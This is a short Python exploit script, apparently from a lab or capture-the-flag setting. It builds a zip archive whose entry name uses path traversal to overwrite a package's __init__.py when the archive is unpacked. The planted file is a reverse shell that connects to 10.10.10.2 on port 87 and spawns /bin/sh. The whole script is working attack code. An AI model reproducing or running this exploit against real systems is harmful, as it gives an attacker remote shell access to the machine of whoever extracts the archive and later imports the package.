import zipfile
z_info = zipfile.ZipInfo(r"../Python/package/__init__.py")
z_file = zipfile.ZipFile("bad.zip", mode="w")
str='socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.2",87));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
z_file.writestr(z_info, str)
#z_info.external_attr = 0777 << 16
z_file.close()